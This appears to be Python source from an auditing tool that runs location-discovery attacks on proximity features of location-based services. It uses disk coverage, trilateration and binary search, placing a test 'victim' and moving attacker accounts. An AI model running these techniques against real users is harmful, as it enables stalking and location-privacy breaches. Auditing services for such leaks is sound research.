"""DUDP and RUDP implementation
"""
from __future__ import absolute_import
import os
import json
import math
import random
from time import sleep, time

from libs.kmlparser import KMLParser
from libs import cells, vector, earth
from libs import verbose as vb
from shapely.geometry import Point

import auditor_constants as const
import auditor_proximity_oracle as apo

class DiscoveryAttack(object):
    """Generic Attack class
    """

    # KML of New York metropolitan area
    NY_METROPOLITAN = "files/data/ny_metropolitan.kml"

    # directory to hold kml files with
    # all polygonal areas used in the attack
    KML_DIR = "files/kml/"
    # directory to hold json object with
    # all the attack info per query
    JSON_DIR = "files/json/"

    # stop binary search is area is smaller than BINARY_STOP_AREA
    BINARY_STOP_AREA = 100

    # at every step of the binary search, we expect to
    # reduce the active search region at least 10%
    # otherwise something is not right
    MIN_REDUCTION = 0.01

    # json object to hold all
    # stages of the attack
    json_out = {
        # queries run during coverage
        # stage of the attack
        "coverage" : [],
        # queries run during DUDP
        # stage of the attack
        "DUDP" : [],
        # queries run during RUDP
        # stage of the attack
        "RUDP" : [],
        # location of victim as reported
        # by the attack
        "est_location" : [],
        # real location of victim based on
        # the coordinates passed to the
        # service on the last update
        "real_location" : [],
    }

    def __init__(self, auditor, attackers, attacker, victim, proj, oracle,
                 test_id, service, test_name, verbose, kml=None, query_lim=None,
                 speed_limit=None):
        """Initializes a Discovery attack

        Args:
            users: the users in our user pool
            proj : the projection used
            oracle: an instance of the ProximityOracle class, either DUDP
                    RUDP or a custom oracle defined by the inherited service
            kml: a path of a kml file with the search area for the victim
        """
        # FIXME add sleep times depending on query rate
        self.kmlparser = KMLParser(proj)
        # pass Auditor class
        self.auditor = auditor
        self.attackers_backup = list(attackers)
        self.attackers = attackers
        self.restart_times = 0
        self.attacker = attacker
        self.victim = victim
        self.proj = proj
        self.oracle = oracle
        self.verbose = verbose
        self.test_id = test_id
        # if limit is None set it to infinity
        self.query_limit = query_lim if query_lim is not None else float('inf')

        #
        # Attack parameters
        #
        # grid size for calculations: can be modified by user in xxx_attack call
        self.grid_size = 20
        # query no in the current attack
        self.attack_queries = 0

        self.test_name = test_name
        self.service_name = service

        #
        # Create directories for attack
        #
        self.kml_dir = ''.join(os.getcwd() + "/" + self.KML_DIR)
        if not os.path.exists(self.kml_dir):
            os.makedirs(self.kml_dir)

        self.json_dir = ''.join(os.getcwd() + "/" + self.JSON_DIR)
        if not os.path.exists(self.json_dir):
            os.makedirs(self.json_dir)

        #
        # Set up victim and seaerth area
        #
        if kml is None:
            self.kml = ''.join(os.getcwd() + "/" + self.NY_METROPOLITAN)
            self.search_area = self.kmlparser.poly_from_kml(self.kml)
        else:
            if os.path.isfile(kml):
                self.kml = kml
                self.search_area = self.kmlparser.poly_from_kml(kml)
            else:
                raise SystemExit("No such kml file")

        # get random victim location in projected coordinates
        (vict_x, vict_y) = self.kmlparser.random_from_polygon(self.search_area,
                                                              1)[0]
        (vict_lon, vict_lat) = proj(vict_x, vict_y, inverse=True)
        vb.vb_print(self.verbose,
                    "Placing victim at " + str([vict_lat, vict_lon]))
        # place victim
        (success, queries) = auditor.auditor_handled_place_at_coords(victim,
                                                                     vict_lat,
                                                                     vict_lon,
                                                                     test_id)
        self.attack_queries += queries
        if not success:
            raise SystemExit("Could not place victim")

    def _update_attacker(self):
        """Get a new attacker from the available users
        """
        if len(self.attackers) == 0:
            vb.vb_print(self.verbose,
                        " *** RUN OUT OF ATTACKERS - RESTARTING  ***",
                        "UDP",
                        True)
            self.attackers = self.attackers_backup
            self.restart_times += 1


        vb.vb_print(self.verbose, " *** updating attacker ***", "UDP", True)
        self.attacker = self.attackers.pop()
        # sleep for some period
        sleep(10)

    def _log_kml(self, msg, polygon):
        """Outputs a kml in @KML_DIR
        """
        output_kml = self.kml_dir + self.service_name + "_" + self.test_name
        output_kml += str(self.test_id) + "_q_" + str(self.restart_times) + "_"
        output_kml +=  str(self.attack_queries) + "_" + msg + ".kml"
        kml = self.kmlparser.kml_from_poly(polygon, output_kml)
        return kml

    def __get_candidate_dist(self, distance, rounding_class):
        """Depending on the rounding class type, inverse rounding
        of distance accordingly and return the candidate values for the
        real distance

        Returns distance in km
        """
        [[min_r, max_r], rounding, family] = rounding_class

        # should never occur, but just to be safe
        if distance is None:
            return None

        if family == const.ROUNDING.UP:
            # distance has been rounded up, thus it could be
            # all anything in [dist - rounding, dist]
            if distance > rounding:
                return [distance - rounding, distance]
            else:
                return [0, distance]
        elif family == const.ROUNDING.DOWN:
            # distance has been rounded up, thus it could be
            # all anything in [dist, dist + rounding]
            return [distance, distance + rounding]
        elif family == const.ROUNDING.BOTH:
            if distance > rounding:
                return [distance - rounding, distance + rounding]
            else:
                return [0, distance +  rounding]

    def __get_ring(self, minR):
        """Asks the proximity oracle and creates a ring respectively
        If we are in the base rounding class, we switch to binary
        """

        # we expect to get an answer from the oracle
        # loop if there is an error and change attacker
        dist = None
        attempts = 0
        while dist is None:
            # get distance and queries from the oracle
            (dist, queries) = self.oracle.in_proximity(self.attacker,
                                                       self.victim,
                                                       self.test_id)
            sleep(2)
            # increase total queries
            self.attack_queries += queries

            # increase queries
            if dist is None and attempts > 5:
                self._update_attacker()
            attempts += 1

        # at this poing we god a distance from the proximity oracle
        # see in which rounding class this oracle belongs to
        for round_class in sorted([cl[0] for cl in self.oracle.round_cl]):
            # get the ranges for which this rounding class is active
            # e.x. from 100 to 200m --> [0.1, 0.2]
            [small_radius, big_radius] = round_class
            if dist >= small_radius and dist <= big_radius:
                vb.vb_print(self.verbose,
                            "Distance returned: " + str(dist),
                            "UDP",
                            True)

                for cl in self.oracle.round_cl:
                    if cl[0] == round_class:
                        # see what the real distance might be (in km)
                        real_dist = self.__get_candidate_dist(dist, cl)
                        break

        if real_dist is None:
            return None

        vb.vb_print(self.verbose,
                    "Candidate distances: " + str(real_dist),
                    "UDP",
                    True)
        attacker_location = self.attacker.loc

        # if we got a rounding class create a ring else return None
        # round_class should have the proper value from the last iteration
        # in the for loop. FIXME messy
        ring = cells.ring(attacker_location[0],
                          attacker_location[1],
                          float(real_dist[0]) * 1000,
                          float(real_dist[1]) * 1000,
                          self.proj)

        # return minimum distance and ring
        return real_dist, ring


    def _place_at_coords(self, attacker, lat, lon, test_id):
        """Attempt to update attacker location until we succeed
        """
        while True:
            vb.vb_print(self.verbose,
                        "Placing user at " + str(lat) + ", " + str(lon),
                        "UDP",
                        True)
            query_id = int(time())
            res = self.auditor.auditor_handled_place_at_coords(attacker,
                                                               lat,
                                                               lon,
                                                               test_id,
                                                               query_id)
            # sleep until location is updated
            sleep(2)
            # add queries regardless of whether we failed
            self.attack_queries += res[1]
            if res[0] is False:
                # if for any reason update failed, change attacker
                self._update_attacker()
            else:
                return res

    def _run_trilateration(self, rounding_classes):
        """Runs a variance of the trilateration attack on the search_area

        Args:
            rouding_classes: a list of intervals with the radiuses

        Returns:
            A polygon in projected coordinates containing the target
            """

        vb.vb_print(self.verbose,
                    "Running trilateration",
                    "UDP",
                    True)
        # get minimum radius in the rounding classes
        MIN_R = sorted([cl[0] for cl in rounding_classes])[0][0]

        #initially the intersection is the whole area
        inter = self.search_area
        # place the attacker in the center
        if self.attacker.loc is None or self.attacker.loc[0] is None:
            starting_loc = cells.poly_centroid(inter, self.proj)
            self._place_at_coords(self.attacker,
                                  starting_loc[0],
                                  starting_loc[1],
                                  self.test_id)

        if self.oracle is None:
            self.oracle = apo.RoundingProximityOracle(self.auditor,
                                                      rounding_classes,
                                                      self.verbose)

        # initially get a rough estimate with 3 queries from
        # three locations at a distance of 120 degrees.
        # Initiate intersection rings
        rings = []
        for i in range(3):
            # get a ring and check if we are switching to binary
            ring_response = self.__get_ring(MIN_R)
            if ring_response is None:
                raise SystemExit("victim not found")
            else:
                distance_range, ring = ring_response
            self._log_kml("ring", ring)
            rings.append(ring)

            #XXX no need to check for multipolygon in case of DUDP
            # as we are working inside a polygonal area
            inter_new = None
            if inter.geom_type == "MultiPolygon":
                for p in inter:
                    cut_inter = p.intersection(ring)
                    if inter_new is None:
                        inter_new = cut_inter
                    else:
                        inter_new = inter_new.union(cut_inter)
            else:
                inter_new = inter.intersection(ring)

            # update the intersection
            inter = ring if inter_new.is_empty else inter_new

            # log kml files
            self.json_out["RUDP"].append({"query": self.attack_queries,
                                          "ring": self._log_kml("ring", ring),
                                          "active_area": self._log_kml("inter",
                                                                       inter),
                                         })

            # update attacker location
            dist = float(distance_range[0] + distance_range[1]) / 2
            # calculate new location for the next query
            new_loc = earth.point_on_earth(self.attacker.loc[0],
                                           self.attacker.loc[1],
                                           dist,
                                           i * 120)

            self._place_at_coords(self.attacker,
                                  new_loc[0],
                                  new_loc[1],
                                  self.test_id)

        # switch to binary
        return inter

    def _run_coverage(self, disk_radii):
        """Runs coverage algorithm on search_area

        disk_radii contains the list of available radii by the service
        This routine attempts to cover the search_area with as few disks
        as possible for the given set of disk_radii and then queries the
        proximity oracle for each of the disks until that returns true.
        Once the proximity oracle is true (the target is found in the disk)
        the routine returns the respective disk

        Args:
            disk_radii: the list of available radii for the disks used
                        by the service in km

        Returns:
            A polygon in projected coordinates with the disk containing
            the target.
        """
        vb.vb_print(self.verbose, "Running Coverage", "UDP", True)

        grid = cells.Cells(self.proj)

        # get largest radius and try to create a grid
        # with hexagons defined by r.
        sorted_radii = sorted(disk_radii, reverse=True)
        disk_radius = sorted_radii[0]

        # pdict is a dictionary with all the grid points.
        # If no keys are found the radius r is too big to
        # create a grid in the search area FIXME should we go for
        # binary directly the moment we have one succesful query?
        while len(grid.pdict.keys()) == 0:
            vb.vb_print(self.verbose,
                        "Attempting to create grid with R=" + str(disk_radius),
                        "UDP",
                        True)

            # Attempt to construct grid with this radius
            grid.construct_grid_in_polygon(self.search_area, disk_radius * 1000)
            try:
                # get the next smaller radius in case this
                disk_radius = sorted_radii[next(x[0] for x in
                                enumerate(sorted_radii) if x[1] < disk_radius)]
            except StopIteration:
                # Normally this should never trigger with the default kml
                raise SystemExit("Can't create grid with the available radii")

        vb.vb_print(self.verbose, "|--> Success!", "UDP", True)
        idx = sorted_radii.index(disk_radius)

        # Take previous r which is what the grid was made with
        # since we have already decreased this once
        disk_radius = sorted_radii[idx - 1]

        if self.oracle is None:
            self.oracle = apo.DiskProximityOracle(self.auditor,
                                                  disk_radius,
                                                  self.verbose)
        else:
            # set this radius in the oracle
            self.oracle.set_radius(disk_radius)

        # create the oracle
        grid_points = grid.pdict.keys()

        # FIXME we should update points based on the speed limits
        # currently let it randomly selects points.
        #
        # As a proper solution we should traverse the squares in a
        # consistent manner (like following a path zig-zag from left
        # to right then up then left etc). The problem is that if the
        # current location of the attacker is in the middle we would
        # have to do like a spiral which complicates stuff. So perhaps,
        #                    |
        #                    v
        # Replace the for loop with a while loop and after every iteration,
        # re-sort the remaining circles based on the distance from the
        # current point. Ugly but works and hopefully we won't have many circles
        random.shuffle(grid_points)
        for point in grid_points:
            # FIXME update depending on query limiting rates
            (lon, lat) = self.proj(float(point[0]),
                                   float(point[1]),
                                   inverse=True)

            # Place the user there respecting any speed constraints
            # Since the points are ordered based on the distance from
            # the current location, this is the closest point
            self._place_at_coords(self.attacker,
                                  lat,
                                  lon,
                                  self.test_id)
            # ask oracle until we get a response
            oracle_rspn = [None, None]
            attempts = 0
            while oracle_rspn[0] is None:
                # ask the oracle if the victim is in proximity
                oracle_rspn = self.oracle.in_proximity(self.attacker,
                                            self.victim,
                                            self.test_id)

                # increase total queries of the attack
                self.attack_queries += oracle_rspn[1]
                if oracle_rspn[0] is None and attempts > 5:
                    self._update_attacker()
                attempts +=1

            circle = cells.circle(lat, lon, disk_radius * 1000, self.proj)
            self._log_kml("coverage", circle)
            self.json_out["coverage"].append({"query": self.attack_queries,
                                              "disk": [lat,
                                                       lon,
                                                       disk_radius * 1000]})
            if oracle_rspn[0] is not None:
                if oracle_rspn[0] is True:
                    vb.vb_print(self.verbose,
                                "Found at " + vector.to_str([lat, lon]) + " !",
                                "DUDP",
                                True)
                    return (circle, disk_radius)

        # if not found return None
        return None, None

    def _run_binary(self, inter, radius, grid_size=20):
        """Runs binary on area

        Args:
            @inter: the projected polygon in which we are running
                    the binary attack algorithm
            @radius: the radius of the disk to perform the cuts
        """

        vb.vb_print(self.verbose, "Running Binary", "UDP", True)

        last_inter_area = float('inf')
        while (inter.area > self.BINARY_STOP_AREA and
               self.attack_queries < self.query_limit):

            vb.vb_print(self.verbose, "Estimating cut", "UDP", True)
            # find projected coordinates that cut inter in half
            proj_coords = cells.cut(inter, self.proj, radius, grid_size)
            circle = Point(proj_coords[0], proj_coords[1]).buffer(radius * 1000)

            self.json_out["DUDP"].append({"query": self.attack_queries,
                                          "disk": self._log_kml("disk",
                                                                circle),
                                          "active_area": self._log_kml("inter",
                                                                       inter),
                                         })

            # calculate the coordinates for the new cut query
            (query_lon, query_lat) = self.proj(proj_coords[0],
                                               proj_coords[1],
                                               inverse=True)

            self._place_at_coords(self.attacker,
                                  query_lat,
                                  query_lon,
                                  self.test_id)

            if self.oracle is None:
                raise SystemExit("oracle should not be None after coverage")

            oracle_rspn = [None, None]
            attempts = 0
            while oracle_rspn[0] is None:
                # ask the oracle if the victim is in proximity
                oracle_rspn = self.oracle.in_proximity(self.attacker,
                                                       self.victim,
                                                       self.test_id)
                # increase queries
                self.attack_queries += oracle_rspn[1]
                if oracle_rspn[0] is None and attempts > 5:
                    self._update_attacker()
                attempts += 1

            if oracle_rspn[0] is True:
                # if in proximity take the intersection
                inter_new = inter.intersection(circle)
            else:
                # else take the difference
                inter_new = inter.difference(circle)

            if inter_new.is_empty:
                print "\n\n\t ***WARNING!! EMPTY INTERSECTION***\n\n"
                inter = circle
            else:
                inter = inter_new

            # log kml
            self._log_kml("inter", inter)

            # if area is not reduced after intersection
            # break to avoid an infinite loop.
            area = inter.area
            if math.fabs(last_inter_area - area) < self.MIN_REDUCTION * area:
                vb.vb_print(self.verbose,
                            "Area not significantly reduced ..stopping",
                            "UDP",
                            True)
                break
            else:
                last_inter_area = inter.area

        est_location = cells.poly_centroid(inter, self.proj)
        vb.vb_print(self.verbose,
                    "Estimated Location: " + str(est_location),
                    "UDP",
                    True)

        real_est_distance = earth.distance_on_unit_sphere(self.victim.loc[0],
                                                          self.victim.loc[1],
                                                          est_location[0],
                                                          est_location[1])
        # convert to m
        real_est_distance *= 1000
        vb.vb_print(self.verbose,
                    "Distance from real loc: " + str(real_est_distance) + "m",
                    "UDP",
                    True)

        self.json_out["est_location"].append({"query": self.attack_queries,
                                              "area" : inter.area,
                                              "coords": [est_location[0],
                                                         est_location[1]]})
        self.json_out["real_location"].append({"query": -1,
                                               "coords": [self.victim.loc[0],
                                                          self.victim.loc[1]]})

        output_json = ''.join(os.getcwd() + "/" + self.JSON_DIR)
        output_json += self.service_name + "_UDP_"
        with open(output_json + str(self.test_id) + ".json", "w") as outfile:
            json.dump(self.json_out, outfile)

        return real_est_distance

    def dudp_attack(self, disk_radii, kml=None, grid_size=20):
        """Runs a DUDP attack

        Args:
            disk_radii: the list of available radii for the disks used
                        by the service in km
        """
        # TODO add documentation
        self.grid_size = grid_size

        # first limit search area into a single circle by running coverage
        # store this circle as the current intersection (inter)
        (inter, radius) = self._run_coverage(disk_radii)

        # now run binary
        # store the area of the last intersection to make
        # sure that after the cut the area is sufficiently reduced
        return self._run_binary(inter, radius)


    def rudp_attack(self, rounding_classes, kml=None, grid_size=20):
        """Runs an RUDP attack

        Args:
            rounding_classes: the rounding classes used by the service
        """
        # first limit search area by running trilateration
        # using the rounding classes. @inter variable now
        # contains an area that is smaller than the minimum
        # radius in the rounding class so we can launch binary
        inter = self._run_trilateration(rounding_classes)
        min_rounding = sorted([cl[1] for cl in rounding_classes])[0]
        self._run_binary(inter, min_rounding)
